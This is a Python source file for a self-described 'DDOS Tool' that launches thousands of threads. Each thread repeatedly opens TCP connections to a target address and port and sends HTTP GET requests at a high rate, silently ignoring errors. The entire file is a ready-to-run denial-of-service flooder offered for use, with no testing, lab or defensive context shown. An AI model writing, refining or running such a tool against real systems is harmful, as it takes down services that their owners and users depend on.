import socket
import threading
import time
import argparse

# Global counter for sent packets
sent_packets = 0
sent_packets_lock = threading.Lock()

# Function to send packets
def send_packets(target_ip, target_port, packets_per_second):
    global sent_packets

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()

            # Increment the counter
            with sent_packets_lock:
                sent_packets += 1

                # Print message every 10,000 packets
                if sent_packets % 10000 == 0:
                    print(f"sent {sent_packets} packets")

        except Exception as e:
            # Handle any exceptions (e.g., connection errors)
            pass

        # Control the rate of packet sending
        time.sleep(1 / packets_per_second)

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='DDOS Tool')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--threads', type=int, default=10000, help='Number of threads (default: 10000)')
    parser.add_argument('--packets', type=int, default=1000000, help='Packets per second (default: 1000000)')
    return parser.parse_args()

def main():
    args = parse_arguments()

    # Extract target IP and port
    target_ip = args.target
    target_port = args.port

    # Create threads
    for _ in range(args.threads):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, args.packets))
        thread.daemon = True  # Set thread as daemon to exit when main program exits
        thread.start()

    # Keep the main thread alive to allow other threads to run
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nProgram terminated.")

if __name__ == '__main__':
    main()